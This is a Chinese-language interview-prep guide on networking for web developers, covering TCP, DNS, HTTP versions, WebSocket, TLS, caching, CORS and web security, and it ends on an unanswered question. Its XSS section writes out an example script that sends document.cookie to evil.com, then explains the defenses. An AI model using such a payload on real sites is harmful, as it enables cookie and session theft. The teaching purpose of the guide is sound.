## TCP/IP 基础

### Q1: TCP 三次握手和四次挥手？⭐⭐ 🔥

**答：**

**三次握手（建立连接）：**

```
客户端                          服务端
  │                               │
  │──── SYN(seq=x) ──────────────>│  第一次：客户端发起连接
  │                               │
  │<─── SYN+ACK(seq=y,ack=x+1) ──│  第二次：服务端确认并回应
  │                               │
  │──── ACK(ack=y+1) ────────────>│  第三次：客户端确认
  │                               │
  └───── 连接建立 ─────────────────┘
```

**为什么是三次而不是两次？** 防止过期的连接请求突然到达服务端，造成资源浪费。

**四次挥手（断开连接）：**

```
客户端                          服务端
  │                               │
  │──── FIN(seq=u) ──────────────>│  第一次：客户端请求关闭
  │                               │
  │<─── ACK(ack=u+1) ────────────│  第二次：服务端确认（可能还有数据要发）
  │                               │
  │<─── FIN(seq=w) ──────────────│  第三次：服务端也请求关闭
  │                               │
  │──── ACK(ack=w+1) ────────────>│  第四次：客户端确认，等待 2MSL
  │                               │
  └───── 连接关闭 ─────────────────┘
```

**为什么是四次？** TCP 是全双工，两个方向需要分别关闭。

**TIME_WAIT（2MSL）的作用：**
1. 确保最后的 ACK 能到达对方（重传机制）
2. 让本次连接的残留数据包在网络中消散

**追问链：**

- **「为什么握手三次、挥手却是四次？」**
  答：握手中服务端的 SYN 和 ACK 可以合并成一包（还没有数据要发）；挥手中服务端收到 FIN 后**可能还有数据没发完**，必须先 ACK「我知道你要关了」，等自己发完再发 FIN——这两个动作不能合并，所以多一次。如果服务端恰好也没数据，ACK 和 FIN 会合并，抓包时看到「三次挥手」就这个原因。
- **「服务器上大量 TIME_WAIT 怎么办？」⭐⭐⭐**
  答：先说结论——TIME_WAIT 出现在**主动关闭方**，海量 TIME_WAIT 的根因通常是**连接复用没做好**：短连接高频建断（HTTP 不开 Keep-Alive、每次请求新建连接）。治理顺序：开启 `keep-alive` 长连接复用（治本）→ 内核参数缓解（`tcp_tw_reuse` 只对客户端方向安全，`tcp_max_tw_buckets` 是超限丢弃）→ 绝对不要用 `tcp_tw_recycle`（NAT 环境丢包，已被内核移除）。面试要点：**TIME_WAIT 是协议设计的安全机制，目标是消灭产生它的短连接模式，而不是消灭它本身**。
- **「SYN 洪泛攻击是什么？怎么防？」**
  答：攻击者伪造源 IP 发 SYN 不回 ACK，服务端半连接队列被占满。防御：`tcp_syncookies`——不分配资源，用加密 cookie 编码连接信息回给客户端，合法客户端回包时再重建连接；同时调大 backlog、缩短 SYN+ACK 重试次数。

### Q2: TCP 和 UDP 的区别？⭐

| 特性 | TCP | UDP |
|:--|:--|:--|
| 连接 | 面向连接 | 无连接 |
| 可靠性 | 可靠（重传、排序） | 不可靠 |
| 速度 | 慢 | 快 |
| 头部 | 20 字节 | 8 字节 |
| 流量控制 | 有（滑动窗口） | 无 |
| 应用场景 | HTTP、FTP、SMTP | DNS、视频、游戏 |

### Q2b: DNS 解析的完整链路？前端能做什么优化？⭐⭐

**答：** 以解析 `www.example.com` 为例，缓存逐级兜底，都没有才走完整查询：

```
① 浏览器 DNS 缓存（Chrome 约 1 分钟）
② 操作系统缓存 + hosts 文件
③ 路由器缓存
④ 本地 DNS 服务器（运营商/公共 DNS，如 223.5.5.5）
   └─ 它也没有 → 由它代你完成「迭代查询」：
      根域名服务器（.）→ 返回 .com 顶级域服务器地址
      .com 顶级域服务器 → 返回 example.com 权威服务器地址
      权威服务器 → 返回 www.example.com 的 A/AAAA 记录
```

**关键概念：递归 vs 迭代**
- 客户端 → 本地 DNS 是**递归**：「我只要最终答案，你去查」；
- 本地 DNS → 根/顶级/权威是**迭代**：「我不知道，但你去问它」。
- 面试一句话：**对客户端递归、对服务器迭代**，压力集中在本地 DNS，所以它的缓存命中率决定了全网解析速度。

**前端/工程侧能做的：**

| 手段 | 解决什么 |
|:--|:--|
| `dns-prefetch` / `preconnect` | 把解析/建连提前到空闲期（见性能篇 Q3b） |
| HTTPDNS（App 常用） | 绕过运营商 LocalDNS，防域名劫持与调度不准 |
| DoH / DoT | DNS 查询加密，防窃听篡改（浏览器已支持 DoH） |
| 减少域名数量 | 每个新域名都要付一次解析成本，别为「并行下载」滥拆域名（HTTP/2 后更无必要） |

**追问：「TTL 是什么？改了解析为什么很久不生效？」**
答：TTL 是记录在各级缓存里的存活时间，由权威服务器设置。改 IP 后旧记录要等 TTL 过期才刷新，所以**迁移服务器前要提前把 TTL 调低**（如 300s），切完再调回——这是运维常识题，答上加分。

## HTTP 协议

### Q3: HTTP 请求方法有哪些？⭐ 🔥

| 方法 | 说明 | 幂等 |
|:--|:--|:--|
| `GET` | 获取资源 | ✅ |
| `POST` | 创建资源 | ❌ |
| `PUT` | 更新资源（全量） | ✅ |
| `PATCH` | 更新资源（部分） | ❌ |
| `DELETE` | 删除资源 | ✅ |
| `HEAD` | 获取响应头 | ✅ |
| `OPTIONS` | 预检请求 | ✅ |

```javascript
// 幂等性：多次请求产生相同结果
GET /users/1        // 幂等
DELETE /users/1     // 幂等（第一次成功，后续返回 404）
POST /users         // 不幂等（每次创建新用户）
PUT /users/1        // 幂等（全量更新，结果一致）
```

### Q3b: GET 和 POST 的区别？（别只背参数位置）⭐ 🔥

**答：** 分三层答：语义 → 行为 → 工程约定。

| 维度 | GET | POST |
|:--|:--|:--|
| 语义 | **安全**（只读，不应有副作用）+ 幂等 | 不安全、不幂等（提交/创建） |
| 参数位置 | URL query（约定） | body（约定） |
| 缓存 | 可被缓存/收藏/留在历史记录 | 默认不缓存 |
| 重试 | 浏览器/代理可放心自动重试 | 不可自动重试（可能重复下单） |
| 编码 | URL 编码 | 多种（form/json/multipart） |

**两个流传很广的误区（面试官最爱钓鱼）：**

1. **「GET 有长度限制、POST 没有」——协议层都不限**。HTTP 规范没有限制 URL 或 body 长度，限制来自浏览器和服务器实现（如 Chrome URL 约 2MB、Nginx 默认 body 1MB）。超长 URL 会被中间设备截断，这才是「别用 GET 传大数据」的真实原因。
2. **「GET 发一个 TCP 包、POST 发两个」——不成立**。POST 是否先发 header 再发 body 取决于 `Expect: 100-continue` 与实现，不是方法本身的属性；GET 带 body 也完全合法（只是语义未定义，很多代理会丢弃）。

**追问链：**

- **「GET 能带 body 吗？」**
  答：语法上可以，RFC 9110 没有禁止，但语义未定义——缓存/代理可能忽略或拒绝。Elasticsearch 的 `_search` 曾用 GET+body，后来也提供 POST 替代。**工程结论：别依赖 GET body**。
- **「POST 不幂等，网络超时后客户端重试怎么防重复下单？」⭐⭐⭐**
  答：**幂等键（Idempotency-Key）**：客户端为一次业务操作生成唯一 ID 放请求头，服务端用它做去重（Redis setnx / 数据库唯一约束），同一 key 的重复请求直接返回首次结果。Stripe 的支付 API 就是这个模式。注意幂等键要绑定「业务意图」而不是「每次请求」——重试必须复用同一个 key，否则等于没做。
- **「为什么 RESTful 里更新用 PUT/PATCH 而不是 POST？」**
  答：语义决定基础设施行为：PUT 幂等，网关/客户端库可以放心重试；POST 不行。用对方法，重试、缓存、监控策略都能按语义自动化。

### Q4: HTTP 状态码分类？⭐ 🔥

| 分类 | 含义 | 常见状态码 |
|:--|:--|:--|
| 1xx | 信息 | 100 Continue, 101 Switching Protocols |
| 2xx | 成功 | 200 OK, 201 Created, 204 No Content |
| 3xx | 重定向 | 301 永久, 302 临时, 304 Not Modified |
| 4xx | 客户端错误 | 400 参数错误, 401 未认证, 403 无权限, 404 不存在 |
| 5xx | 服务端错误 | 500 内部错误, 502 网关错误, 503 服务不可用 |

```javascript
// 301 vs 302
// 301：永久重定向，浏览器缓存，SEO 权重转移
// 302：临时重定向，不缓存

// 304：协商缓存命中，不返回 body
// 502 vs 504
// 502：上游服务返回无效响应
// 504：上游服务超时
```

### Q5: HTTP/1.1、HTTP/2、HTTP/3 的区别？⭐⭐ 🔥

**答：**

| 特性 | HTTP/1.1 | HTTP/2 | HTTP/3 |
|:--|:--|:--|:--|
| 连接 | 长连接（Keep-Alive） | 多路复用 | 多路复用 |
| 传输层 | TCP | TCP | QUIC (UDP) |
| 头部 | 文本，重复 | HPACK 压缩 | QPACK 压缩 |
| 队头阻塞 | 有（TCP 层） | 无（应用层），TCP 层仍有 | 完全解决 |
| 服务端推送 | 不支持 | 支持 | 支持 |
| 加密 | 可选 | 默认 TLS | 内置 TLS 1.3 |

**HTTP/2 多路复用：**

```
HTTP/1.1（串行请求）
请求1 → 响应1 → 请求2 → 响应2 → 请求3 → 响应3

HTTP/2（并行多路复用，同一连接）
连接 {
  Stream 1: 请求1 → 响应1
  Stream 2: 请求2 → 响应2
  Stream 3: 请求3 → 响应3
}  // 同时进行，互不阻塞
```

**HTTP/3 (QUIC) 的优势：**
- 基于 UDP，0-RTT 建连（更快）
- 彻底解决 TCP 队头阻塞
- 连接迁移（切换网络不断开）

**追问链：**

- **「HTTP/2 说解决了队头阻塞，为什么又说 TCP 层还有？」⭐⭐⭐**
  答：HTTP/2 解决的是 **HTTP 协议层**的排队（1.1 里同一连接必须一问一答串行）。但多个 Stream 复用在**同一条 TCP 连接**上，TCP 只认字节流：任何一个包丢失，内核必须等重传补齐才能把后面的数据交给应用——丢一个包，所有 Stream 一起卡。网络越差（丢包率高）HTTP/2 相对 1.1 的收益越小，甚至更差。HTTP/3 在 QUIC 层按 Stream 独立重传恢复，才真正解掉。
- **「HTTP/3 为什么基于 UDP 而不是改进 TCP？」**
  答：两个原因：① TCP 栈在**操作系统内核**里，客户端和服务端的内核升级周期以年计，无法快速普及新特性；UDP 在用户态实现，QUIC 协议升级随应用走。② 内核 TCP 栈无法做到**连接迁移**——TCP 四元组（源 IP/端口 + 目标 IP/端口）变了连接就断，WiFi 切 4G 必然重连；QUIC 用 Connection ID 标识连接，IP 变了会话还在。选 UDP 只是因为它是「能自定义传输行为的最低层」，可靠性由 QUIC 自己在用户态重做。
- **「0-RTT 是什么？有什么风险？」**
  答：复用之前会话的密钥参数，第一个包就带上应用数据，省一次往返。风险是 **0-RTT 数据可被重放**（没有完整握手防重放保护），所以只允许幂等请求（GET）走 0-RTT，支付类请求必须等 1-RTT 完整握手。
- **「HTTP/2 的服务端推送（Server Push）现在还能用吗？」⭐⭐⭐**
  答：**基本退出历史舞台**——Chrome 106 已移除支持。失败原因：服务端猜不准客户端缺什么资源，推过去的往往已在缓存里，白白浪费带宽，命中率实测很低。替代方案是 **103 Early Hints**：服务端在处理请求的「思考时间」里先回一个 103 响应，带上 `Link: </app.css>; rel=preload`，让浏览器提前发资源请求，最终 200 响应照常——把「猜你要什么」换成「告诉你我要给你什么」，决策权回到 HTML/服务端渲染逻辑手里。表格里「HTTP/2 支持服务端推送」是协议事实，但 2026 年面试要主动补上「已被弃用 + Early Hints 替代」，否则显得知识停在 2018。

### Q5b: WebSocket 的握手过程？怎么保活和重连？⭐⭐ 🔥

**答：** WebSocket 借用 HTTP 完成握手，然后「升级」为独立的双向帧协议：

```http
# 客户端：带 Upgrade 的 GET 请求
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==   # 随机 16 字节的 base64
Sec-WebSocket-Version: 13

# 服务端：101 切换协议
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**`Sec-WebSocket-Key` 的校验机制（追问必考）：**
服务端把 Key 拼上固定 GUID `258EAFA5-E914-47DA-95CA-C5AB0DC85B11`，做 SHA-1 再 base64，结果放进 `Sec-WebSocket-Accept`。目的不是安全（算法公开），而是**证明双方真的理解 WebSocket 协议**——防止普通 HTTP 服务器/缓存代理误把这次请求当普通响应处理。

**握手之后：不再是 HTTP**
- 数据按**帧（frame）**传输：opcode 区分文本/二进制/ping/pong/close，头部最小 2 字节（对比 HTTP 每次几百字节头部）；
- 全双工：两端随时可发，无需请求-响应配对。

**保活与重连（线上真正的难点）：**

```javascript
// 心跳：应用层定时 ping，超时未收到 pong 判定死连接
// （协议层 ping/pong 帧浏览器 JS 不可控，所以要应用层自己做）
const HEARTBEAT = 30_000;
let timer = setInterval(() => {
  if (ws.readyState !== WebSocket.OPEN) return;
  ws.send(JSON.stringify({ type: 'ping' }));
  // 若 10s 内没收到 pong → ws.close() 触发重连
}, HEARTBEAT);

// 重连：指数退避 + 抖动，防止服务端重启时万客户端同时冲击
let attempt = 0;
function reconnect() {
  const delay = Math.min(30_000, 1000 * 2 ** attempt) + Math.random() * 1000;
  setTimeout(() => { attempt++; connect(); }, delay);
}
// 连接成功后 attempt 归零；重连后要用 Last-Event-ID/序号补拉离线期间消息
```

**追问链：**

- **「为什么需要心跳？TCP 不是有 keepalive 吗？」**
  答：TCP keepalive 默认 2 小时才探测，且只能证明「对端内核活着」，证明不了应用进程还能处理消息（进程假死、Nginx 静默断连都探不出来）。中间代理（Nginx `proxy_read_timeout` 默认 60s）还会主动掐掉长时间无数据的连接——心跳同时承担「保活」和「探活」两个职责。
- **「WebSocket 和长轮询、SSE 怎么选？」**
  答：长轮询（请求挂起等数据，返回后立刻再发）实现最土但兼容性最好；SSE 单向推送、自带重连，HTTP/2 下无连接数问题；WebSocket 双向高频。详细取舍见本篇深水区「SSE vs WebSocket」一问。
- **「wss 和 ws 的关系？」**
  答：就是 WebSocket  over TLS，对应 https 与 http。HTTPS 页面里连 `ws://` 会被当 Mixed Content 拦截，生产必须 `wss://`。

## HTTPS

### Q6: HTTPS 的握手过程？⭐⭐⭐ 🔥

**答：**

```
客户端                                    服务端
  │                                         │
  │── ClientHello（支持的加密套件、随机数1）──>│
  │                                         │
  │<── ServerHello（选定加密套件、随机数2）──│
  │<── Certificate（服务端证书）────────────│
  │<── ServerHelloDone ────────────────────│
  │                                         │
  │  验证证书（CA 签名链）                   │
  │  生成随机数3（Pre-Master Secret）        │
  │                                         │
  │── ClientKeyExchange（加密的随机数3）───>│
  │── ChangeCipherSpec ───────────────────>│
  │── Finished（加密握手信息）────────────>│
  │                                         │
  │<── ChangeCipherSpec ──────────────────│
  │<── Finished ──────────────────────────│
  │                                         │
  └──── 对称加密通信 ────────────────────────┘

  会话密钥 = f(随机数1, 随机数2, 随机数3)
```

**为什么混合使用非对称加密和对称加密？**
- 非对称加密（RSA/ECDHE）：安全交换密钥，但速度慢
- 对称加密（AES）：速度快，适合大量数据传输
- 结合两者优势：用非对称加密传输对称密钥，再用对称加密传输数据

### Q7: 什么是中间人攻击？HTTPS 如何防范？⭐⭐⭐

```
中间人攻击（MITM）：
客户端 ←→ 攻击者 ←→ 服务端
（攻击者截获并篡改通信内容）

HTTPS 防范手段：
1. CA 证书验证：浏览器内置受信任的 CA 根证书
2. 证书链验证：服务器证书 → 中间 CA → 根 CA
3. 数字签名：CA 用私钥签名，客户端用公钥验证
4. HSTS：强制使用 HTTPS（HTTP Strict Transport Security）
```

**追问链：**

- **「TLS 1.3 相比 1.2 握手快在哪？」**
  答：1.2 需要两个 RTT（协商 + 密钥交换），1.3 砍成 **1-RTT**：ClientHello 直接带着密钥交换参数（key_share）发出，服务端一个包就能确认，不需要中间再协商套件。再叠加 0-RTT 会话恢复。同时 1.3 删掉了一大批不安全套件（RSA 密钥交换、CBC 模式），只保留前向安全（PFS）的 ECDHE 类套件——**前向安全**指即使服务端私钥日后泄露，历史抓包也无法解密。
- **「浏览器怎么验证一张证书？」**
  答：四步：① 验证证书链（站点证书 → 中间 CA → 内置根 CA，逐级验签）；② 验证域名匹配（CN/SAN）；③ 验证有效期与吊销状态（CRL/OCSP，1.3 用 OCSP Stapling 由服务端附带时戳减少往返）；④ 检查用途扩展（EKU）。任何一步失败浏览器都会拦截并给出明确错误码——这也是「企业代理装自签证书才能抓 HTTPS 包」的原理。

## HTTP 缓存

### Q8: 强缓存和协商缓存？⭐⭐ 🔥

**答：**

```
浏览器请求资源
      ↓
检查强缓存（Cache-Control / Expires）
      ↓
命中 → 直接使用本地缓存（200 from disk/memory cache）
      ↓（未命中或过期）
发送请求，携带协商缓存标识
      ↓
服务端检查（Last-Modified / ETag）
      ↓
未修改 → 304 Not Modified（使用本地缓存）
已修改 → 200 OK（返回新资源）
```

**强缓存：**

```http
# Cache-Control（HTTP/1.1，优先级高）
Cache-Control: max-age=31536000        # 缓存 1 年
Cache-Control: public                  # 可被代理缓存
Cache-Control: private                 # 只能被浏览器缓存
Cache-Control: no-cache                # 不缓存，每次协商
Cache-Control: no-store                # 完全不缓存
Cache-Control: immutable               # 内容永不改变

# Expires（HTTP/1.0，绝对时间，受客户端时间影响）
Expires: Wed, 21 Oct 2026 07:28:00 GMT
```

**协商缓存：**

```http
# Last-Modified / If-Modified-Since（秒级精度）
Last-Modified: Wed, 21 Oct 2025 07:28:00 GMT
If-Modified-Since: Wed, 21 Oct 2025 07:28:00 GMT

# ETag / If-None-Match（内容 hash，更精确）
ETag: "a3f5c8b2d1"
If-None-Match: "a3f5c8b2d1"
```

**最佳实践：**

```nginx
# 静态资源（带 hash 文件名）：强缓存 1 年
location /assets/ {
  add_header Cache-Control "public, max-age=31536000, immutable";
}

# HTML 文件：协商缓存
location ~* \.html$ {
  add_header Cache-Control "no-cache";
}
```

**追问链：**

- **「no-cache 和 no-store 到底差在哪？」**
  答：`no-cache` 是「可以缓存，但用前必须协商验证」；`no-store` 是「彻底不许落盘」。HTML 入口用 `no-cache`（享受 304 的同时保证新鲜），涉及用户隐私/敏感数据的响应用 `no-store`。把 HTML 配成 `no-store` 是常见过度防御——白白丢掉协商缓存能力。
- **「ETag 和 Last-Modified 同时存在时听谁的？ETag 有什么坑？」**
  答：优先 ETag（内容级精确到字节，Last-Modified 只有秒级精度且改内容不改时间会漏）。坑有两个：① Nginx 默认 ETag 由 mtime + size 生成，内容改了 mtime 没变（反代/同步工具保留时间戳）会误 304；② 多机部署时如果各机器用强 ETag（inode 相关）会不一致，同一资源在不同节点返回不同 ETag，导致缓存命中率崩塌——**多机场景要么统一 hash 算法，要么只依赖 Last-Modified**。
- **「强缓存生效时浏览器行为上有什么可见证据？」**
  答：DevTools Network 里显示 `from memory cache`（当前会话内重复访问）或 `from disk cache`（跨会话），状态 200、请求本体没发出去。这可作为「我配了强缓存」的现场验证手段。

### Q8b: Service Worker 缓存和 HTTP 缓存什么关系？策略怎么选？⭐⭐⭐

**答：** SW 是插在「页面与网络之间」的可编程代理层，**优先级在 HTTP 缓存之前**：

```
页面 fetch
   ↓
Service Worker（Cache API，JS 完全可控）
   ↓ 未命中 / 放行
HTTP 缓存（强缓存 → 协商缓存，浏览器自动）
   ↓ 未命中
网络
```

两层缓存职责不同：HTTP 缓存管「单资源的新鲜度」，SW 管「应用级的离线与秒开」。

**四种经典策略（Workbox 内置）：**

| 策略 | 行为 | 适用 |
|:--|:--|:--|
| Cache First | 缓存有就直接回，没有才回源并写缓存 | 带 hash 的静态资源、字体图片 |
| Network First | 先请求网络，失败/超时回退缓存 | HTML 入口、时效性接口 |
| Stale-While-Revalidate | 先回缓存（秒开），后台静默更新 | 头像、列表页、非关键 API |
| Network Only | 不走 SW 缓存 | 支付、登录等绝不能旧的请求 |

```javascript
// 手写 SWR 策略（理解原理，生产用 Workbox）
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.open('v1').then(async (cache) => {
      const cached = await cache.match(event.request);
      const network = fetch(event.request).then((res) => {
        cache.put(event.request, res.clone());  // 响应流只能读一次，必须 clone
        return res;
      });
      return cached || network;   // 有缓存先回缓存，网络结果留给下次
    })
  );
});
```

**追问链（SW 真正的难点在更新）：**

- **「改了 sw.js，用户为什么还是旧页面？」⭐⭐⭐**
  答：SW 更新是**字节级对比 + 等待接管**：浏览器每次导航都会后台重新下载 sw.js，逐字节比较，有差异才安装新版本；但新 SW 进入 `waiting` 状态，**要等旧 SW 控制的所有页签都关闭**才 activate。解法：`self.skipWaiting()`（安装后立即接管）+ `clients.claim()`（接管现有页签），但要注意新旧版本缓存结构不兼容时的清理逻辑（activate 里删旧 cache）。另外 sw.js 本身**绝不能被强缓存**（`Cache-Control: no-cache`），否则更新链路从源头断掉。
- **「SW 能拦截所有请求吗？」**
  答：只拦截其 scope 内页面发出的请求；首次注册 SW 的那次加载不受控（要 `clients.claim()` 或刷新后才生效）；跨域请求默认 opaque 响应，`cache.put` 可以存但读不到内容、状态码不可判——缓存跨域资源要显式处理。
- **「SW 和 Web Worker 什么区别？」**
  答：同源于 Worker 线程模型，但生命周期与职责完全不同：Web Worker 随页面销毁、做计算；SW 独立于页面存活、做请求拦截与推送，没有 DOM 也不能直接访问页面，靠 `postMessage`/`clients` 通信。

## 跨域

### Q9: 什么是同源策略？跨域解决方案？⭐⭐ 🔥

**答：**

同源策略：协议 + 域名 + 端口 三者相同才是同源。

```
http://example.com       → http://example.com/api   ✅ 同源
http://example.com       → https://example.com      ❌ 协议不同
http://example.com       → http://api.example.com   ❌ 域名不同
http://example.com:80    → http://example.com:8080  ❌ 端口不同
```

**跨域解决方案：**

**1. CORS（推荐，服务端配置）**

简单请求直接带 `Origin`；PUT/DELETE、`application/json`、自定义头会先发 OPTIONS 预检。服务端至少要回这些头：

```http
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
Vary: Origin
```

注意：带 Cookie 时 `Allow-Origin` 不能写 `*`，必须回显具体来源；否则浏览器直接拒绝。

```javascript
// Express：最小可用的 CORS 中间件（不引入 cors 包也能讲清逻辑）
const ALLOWED = new Set(['https://app.example.com']);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin); // 回显白名单
    res.setHeader('Vary', 'Origin');                      // 防止 CDN 串号
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');
  if (req.method === 'OPTIONS') return res.sendStatus(204); // 预检到此结束
  next();
});
```

**2. Nginx 反向代理（生产：同源化，绕开浏览器跨域限制）**

```nginx
location /api/ {
  proxy_pass http://backend-server/;
  proxy_set_header Host $host;
}
```

**3. 开发服务器代理（开发环境）**

```javascript
// vite.config.js（Webpack 的 devServer.proxy 写法类似）
export default defineConfig({
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:3000',
        changeOrigin: true,
        rewrite: (p) => p.replace(/^\/api/, ''),
      },
    },
  },
});
```

**4. JSONP（只支持 GET，已不推荐）**

```javascript
function jsonp(url, callback) {
  const script = document.createElement('script');
  const cbName = 'jsonp_' + Date.now();

  window[cbName] = (data) => {
    callback(data);
    delete window[cbName];
    document.body.removeChild(script);
  };

  script.src = `${url}?callback=${cbName}`;
  document.body.appendChild(script);
}
```

### Q10: CORS 预检请求（OPTIONS）什么时候触发？⭐⭐

```javascript
// 简单请求（不触发预检）
// 方法：GET / POST / HEAD
// Content-Type：
//   - text/plain
//   - multipart/form-data
//   - application/x-www-form-urlencoded

// 复杂请求（触发预检 OPTIONS）
// 1. 方法不是 GET/POST/HEAD
// 2. Content-Type 是 application/json
// 3. 自定义请求头（如 Authorization）
// 4. 使用了 ReadableStream

// 预检请求示例
OPTIONS /api/data HTTP/1.1
Origin: http://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization

// 预检响应
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: http://example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400  // 缓存 24 小时，减少预检次数
```

## Web 安全

### Q11: XSS 和 CSRF 攻击及防御？⭐⭐ 🔥

**XSS（跨站脚本攻击）：**

```javascript
// 存储型 XSS：恶意脚本存入数据库
// 反射型 XSS：恶意脚本在 URL 参数中
// DOM 型 XSS：前端直接操作 DOM 导致

// 攻击示例
<script>
  document.location = 'http://evil.com?cookie=' + document.cookie;
</script>

// 防御措施
// 1. 输入过滤（转义 HTML 特殊字符）
function escapeHtml(str) {
  return str.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
}

// 2. 输出编码（根据上下文选择）
// 3. CSP（内容安全策略）
// Content-Security-Policy: default-src 'self'; script-src 'self'

// 4. HttpOnly Cookie（防止 JS 读取 Cookie）
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
```

**CSRF（跨站请求伪造）：**

```javascript
// 攻击原理：用户登录 A 站后，访问恶意 B 站
// B 站发起对 A 站的请求，浏览器自动携带 A 站 Cookie

// 防御措施
// 1. CSRF Token（最有效）
// 服务端生成 Token，嵌入表单
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="random-token">
</form>

// 2. SameSite Cookie
Set-Cookie: session=xxx; SameSite=Strict  // 完全禁止跨站携带
Set-Cookie: session=xxx; SameSite=Lax     // 允许顶级导航

// 3. 验证 Referer / Origin
// 4. 双重 Cookie 验证
```

**追问链：**

- **「XSS 和 CSRF 一句话说清区别？」**
  答：XSS 是「攻击者的**脚本**跑在受害者页面里」——偷的是数据、可做任意操作；CSRF 是「攻击者**借**受害者浏览器里已有的登录态发请求」——只发请求、读不到响应。防御思路由此推导：XSS 防注入（转义 + CSP + HttpOnly），CSRF 防伪造请求（Token + SameSite），HttpOnly 防 XSS 偷 Cookie 但**完全不防 CSRF**（CSRF 本来就不需要读 Cookie，浏览器自动带）。
- **「带 Cookie 的 CORS 请求有什么特殊限制？」⭐⭐⭐**
  答：两条硬规则：① `Access-Control-Allow-Origin` **不能是 `*`**，必须回写具体的 Origin；② `Access-Control-Allow-Credentials: true` 必须同时返回。漏了任意一条，浏览器拦截响应并报 CORS 错误。这是「本地联调通了、上线带 Cookie 全挂」的高频事故，因为开发环境常配 `*`。
- **「跨域到底是谁拦的？」**
  答：**浏览器**。请求其实发出去了、服务端也处理了（POST 甚至能造成副作用），只是浏览器把**响应**扣下来不给 JS。这解释了三件事：服务端之间调用没有跨域问题；curl 没有跨域问题；CSRF 能成功（恶意站发的请求不关心响应）。

## 常见坑速查表

| 现象 | 根因 | 解法 |
|:--|:--|:--|
| 发版后用户页面还是旧的 | HTML 被强缓存，加载了旧入口 | HTML 用 no-cache，只有带 hash 的静态资源才强缓存 |
| 本地联调通、线上带 Cookie 跨域全挂 | `Allow-Origin: *` 与 credentials 互斥 | 回写具体 Origin + Allow-Credentials: true |
| 每次 PUT/JSON 请求都多发一个请求 | 触发 CORS 预检，Max-Age 没配或被代理剥掉 | 服务端返回 Access-Control-Max-Age，网关别过滤 OPTIONS |
| HTTPS 页面加载报 Mixed Content | 页面里引用了 http:// 资源 | 全站资源走相对路径或 https，配 CSP upgrade-insecure-requests |
| 服务器 TIME_WAIT 数万 | 高频短连接 | 开 Keep-Alive / 连接池复用；禁用 tcp_tw_recycle |
| 502 和 504 分不清 | 502 上游挂/返回非法响应；504 上游超时 | 502 查进程存活，504 查上游耗时与超时配置 |
| 抓不到 HTTPS 包 | 证书链验证失败 | 信任抓包工具根证书；注意 App 可能走证书锁定（SSL Pinning） |
| ETag 多机不一致 | 强 ETag 含 inode/mtime 各机不同 | 多机统一 hash 或退回 Last-Modified |
| WebSocket 线上总是 60s 左右断 | Nginx `proxy_read_timeout` 默认 60s 掐空闲连接 | 应用层心跳 + 调大代理超时 + 指数退避重连 |
| 改了 sw.js 用户还是旧页面 | 新 SW 在 waiting 等旧页签全关；或 sw.js 被强缓存 | skipWaiting + clients.claim；sw.js 配 no-cache |
| POST 超时重试导致重复下单 | POST 不幂等，重试无去重 | Idempotency-Key + 服务端唯一约束去重 |

## 深水区追问（2026 补充）

**Q：SSE 和 WebSocket 怎么选？为什么 SSE 在 HTTP/1.1 下会「自己把自己堵死」？**

答：① 协议形态：SSE 是一条普通的 HTTP 响应（`Content-Type: text/event-stream`），服务端单向推、客户端只读；WebSocket 是 `Upgrade` 之后的双向帧协议。② HTTP/1.1 下同一个域名只允许约 6 个并发连接，一条 SSE 会长期占住其中一个且永不结束，开几个标签页就把配额吃干净，后续请求只能排队——这就是「自己把自己堵死」；HTTP/2 多路复用后同一个连接跑多条流，配额问题消失。③ 选型结论：通知、进度、行情这类**单向**推送用 SSE，成本低（能过 CDN、能复用 Cookie 鉴权、自带断线重连和 `Last-Event-ID` 续传）；协同编辑、游戏、高频双向交互才用 WebSocket，代价是心跳保活、代理 `Upgrade` 透传、连接数随客户端线性增长。

**Q：CDN 上的资源怎么做到「发布即生效」？`s-maxage`、`stale-while-revalidate`、purge 各解决什么？**

答：① 分工：带 hash 的静态资源用 `Cache-Control: public, max-age=31536000, immutable`，HTML 用 `no-cache`，让「换文件名」承担发布语义，而不是靠刷缓存。② `s-maxage` 只对**共享缓存**（CDN/代理）生效并覆盖 `max-age`，浏览器仍按 `max-age` 走——这是「想让 CDN 短缓存、浏览器长缓存」的唯一干净写法。③ `stale-while-revalidate` 让副本过期后先继续用旧内容、同时后台回源，削掉发版瞬间的回源尖峰；`stale-if-error` 让回源 5xx 时继续供旧副本，避免 CDN 把故障放大成白屏。④ 兜底靠 purge（URL 刷新或目录刷新），只刷变更路径；注意 `Vary` 头、压缩方式不同都会分裂缓存键，命中率会莫名掉。

**Q：HTTP/3 落地要跨过哪些工程门槛？**

